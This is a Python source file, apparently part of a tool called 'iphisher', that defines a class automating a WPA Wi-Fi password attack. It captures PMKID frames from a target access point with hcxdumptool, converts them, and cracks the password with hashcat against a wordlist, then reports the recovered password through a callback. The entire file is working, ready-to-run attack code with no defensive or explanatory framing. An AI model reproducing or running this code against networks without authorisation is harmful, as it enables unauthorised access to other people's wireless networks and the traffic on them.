import os
import subprocess
import threading
import time
from typing import Optional, Callable


class PMKIDAttack:
    """
    Capture PMKID from target AP using hcxdumptool, then crack with hashcat.
    Does not require a client to be associated.
    """

    def __init__(self, iface: str, bssid: str, wordlist: str,
                 on_success: Optional[Callable[[str], None]] = None):
        self.iface = iface
        self.bssid = bssid
        self.wordlist = wordlist
        self.on_success = on_success
        self.result: Optional[str] = None
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._cap_file = f"/tmp/iphisher_pmkid_{bssid.replace(':', '')}.pcapng"
        self._hash_file = f"/tmp/iphisher_pmkid_{bssid.replace(':', '')}.hc22000"

    def start(self) -> None:
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=30)

    def wait(self, timeout: int = 300) -> Optional[str]:
        if self._thread:
            self._thread.join(timeout=timeout)
        return self.result

    def _run(self) -> None:
        if not self._capture_pmkid():
            return
        if self._stop_event.is_set():
            return
        if not self._convert_to_hashcat():
            return
        if self._stop_event.is_set():
            return
        password = self._crack()
        if password:
            self.result = password
            if self.on_success:
                self.on_success(password)

    def _capture_pmkid(self, duration: int = 30) -> bool:
        """Capture PMKID frames from the target AP."""
        bssid_filter = self.bssid.replace(":", "").lower()
        filter_file = f"/tmp/iphisher_filter_{bssid_filter}.txt"
        with open(filter_file, "w") as f:
            f.write(bssid_filter + "\n")
        try:
            proc = subprocess.Popen(
                [
                    "hcxdumptool",
                    "-i", self.iface,
                    f"--filterlist_ap={filter_file}",
                    "--filtermode=2",
                    "-o", self._cap_file,
                    "--enable_status=1",
                ],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            deadline = time.time() + duration
            while time.time() < deadline:
                if self._stop_event.is_set():
                    proc.terminate()
                    return False
                if os.path.exists(self._cap_file) and os.path.getsize(self._cap_file) > 0:
                    # Check if PMKID captured
                    result = subprocess.run(
                        ["hcxpcapngtool", "-o", self._hash_file, self._cap_file],
                        capture_output=True, timeout=5,
                    )
                    if os.path.exists(self._hash_file) and os.path.getsize(self._hash_file) > 0:
                        proc.terminate()
                        proc.wait(timeout=5)
                        return True
                time.sleep(2)
            proc.terminate()
            proc.wait(timeout=5)
            return os.path.exists(self._cap_file) and os.path.getsize(self._cap_file) > 0
        except FileNotFoundError:
            return False
        except Exception:
            return False
        finally:
            try:
                os.remove(filter_file)
            except Exception:
                pass

    def _convert_to_hashcat(self) -> bool:
        """Convert pcapng to hashcat 22000 format."""
        try:
            result = subprocess.run(
                ["hcxpcapngtool", "-o", self._hash_file, self._cap_file],
                capture_output=True, timeout=30,
            )
            return os.path.exists(self._hash_file) and os.path.getsize(self._hash_file) > 0
        except Exception:
            return False

    def _crack(self) -> Optional[str]:
        """Run hashcat against captured PMKID hash."""
        out_file = self._hash_file + ".cracked"
        try:
            proc = subprocess.Popen(
                [
                    "hashcat",
                    "-m", "22000",
                    self._hash_file,
                    self.wordlist,
                    "-o", out_file,
                    "--quiet",
                    "--force",
                ],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            while proc.poll() is None:
                if self._stop_event.is_set():
                    proc.terminate()
                    return None
                if os.path.exists(out_file):
                    with open(out_file) as f:
                        line = f.readline().strip()
                    if ":" in line:
                        return line.split(":")[-1]
                time.sleep(3)

            if os.path.exists(out_file):
                with open(out_file) as f:
                    line = f.readline().strip()
                if ":" in line:
                    return line.split(":")[-1]
        except Exception:
            pass
        return None
